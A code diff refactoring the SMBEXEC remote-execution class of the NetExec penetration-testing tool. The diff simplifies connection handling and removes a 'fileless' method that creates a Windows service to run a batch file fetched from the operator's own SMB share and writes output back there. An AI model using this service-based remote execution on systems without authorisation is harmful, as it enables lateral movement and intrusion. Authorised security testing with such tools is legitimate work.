@@ -1,79 +1,28 @@
 import os
 from os.path import join as path_join
 from time import sleep
-from impacket.dcerpc.v5 import transport, scmr
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.dcerpc.v5 import scmr
 from nxc.helpers.misc import gen_random_string
 from nxc.paths import TMP_PATH
 from nxc.helpers.rpc import NXCRPCConnection
 
 
 class SMBEXEC:
-    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None, connection=None):
-        self.__host = host
-        self.__share_name = share_name
-        self.__port = port
-        self.__username = username
-        self.__password = password
+    def __init__(self, connection, share=None, logger=None, tries=None):
         self.__serviceName = gen_random_string()
-        self.__domain = domain
-        self.__lmhash = ""
-        self.__nthash = ""
         self.__share = share
-        self.__smbconnection = smbconnection
         self.__output = None
         self.__batchFile = None
         self.__outputBuffer = b""
         self.__shell = "%COMSPEC% /Q /c "
         self.__retOutput = False
-        self.__scmr = None
-        self.__aesKey = aesKey
-        self.__doKerberos = doKerberos
-        self.__remoteHost = remoteHost
-        self.__kdcHost = kdcHost
         self.__tries = tries
         self.logger = logger
         self.__connection = connection
 
-        if hashes is not None:
-            # This checks to see if we didn't provide the LM Hash
-            if hashes.find(":") != -1:
-                self.__lmhash, self.__nthash = hashes.split(":")
-            else:
-                self.__nthash = hashes
-
-        if self.__password is None:
-            self.__password = ""
-
-        if self.__connection:
-            rpc = NXCRPCConnection(self.__connection)
-            self.__scmr = rpc.connect(r"\svcctl", scmr.MSRPC_UUID_SCMR)
-            self.__rpctransport = rpc.transport
-        else:
-            stringbinding = f"ncacn_np:{self.__host}[\\pipe\\svcctl]"
-            self.logger.debug(f"StringBinding {stringbinding}")
-            self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
-            self.__rpctransport.set_dport(self.__port)
-
-            if hasattr(self.__rpctransport, "setRemoteHost"):
-                self.__rpctransport.setRemoteHost(self.__remoteHost)
-
-            if hasattr(self.__rpctransport, "set_credentials"):
-                self.__rpctransport.set_credentials(
-                    self.__username,
-                    self.__password,
-                    self.__domain,
-                    self.__lmhash,
-                    self.__nthash,
-                    self.__aesKey,
-                )
-                self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
-
-            self.__scmr = self.__rpctransport.get_dce_rpc()
-            if self.__doKerberos:
-                self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-            self.__scmr.connect()
-            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+        rpc = NXCRPCConnection(self.__connection)
+        self.__scmr = rpc.connect(r"\svcctl", scmr.MSRPC_UUID_SCMR)
+        self.__rpctransport = rpc.transport
 
         s = self.__rpctransport.get_smb_connection()
         # We don't wanna deal with timeouts from now on.
@@ -148,10 +97,11 @@ class SMBEXEC:
             return
 
         tries = 1
+        smbConnection = self.__connection.conn
         while True:
             try:
                 self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
-                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
+                smbConnection.getFile(self.__share, self.__output, self.output_callback)
                 break
             except Exception as e:
                 if tries >= self.__tries:
@@ -180,57 +130,9 @@ class SMBEXEC:
 
         try:
             self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
-            self.__smbconnection.deleteFile(self.__share, self.__output)
+            smbConnection.deleteFile(self.__share, self.__output)
         except Exception:
             pass
-
-    def execute_fileless(self, data):
-        self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
-        local_ip = self.__rpctransport.get_socket().getsockname()[0]
-
-        command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data
-
-        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
-            batch_file.write(command)
-
-        self.logger.debug("Hosting batch file with command: " + command)
-
-        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
-        self.logger.debug("Command to execute: " + command)
-
-        self.logger.debug(f"Remote service {self.__serviceName} created.")
-        resp = scmr.hRCreateServiceW(
-            self.__scmr,
-            self.__scHandle,
-            self.__serviceName,
-            self.__serviceName,
-            lpBinaryPathName=command,
-            dwStartType=scmr.SERVICE_DEMAND_START,
-        )
-        service = resp["lpServiceHandle"]
-
-        try:
-            self.logger.debug(f"Remote service {self.__serviceName} started.")
-            scmr.hRStartServiceW(self.__scmr, service)
-        except Exception:
-            pass
-        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
-        scmr.hRDeleteService(self.__scmr, service)
-        scmr.hRCloseServiceHandle(self.__scmr, service)
-        self.get_output_fileless()
-
-    def get_output_fileless(self):
-        if not self.__retOutput:
-            return
-
-        while True:
-            try:
-                with open(path_join(TMP_PATH, self.__output), "rb") as output:
-                    self.output_callback(output.read())
-                break
-            except OSError:
-                sleep(2)
 
     def finish(self):
         # Just in case the service is still created
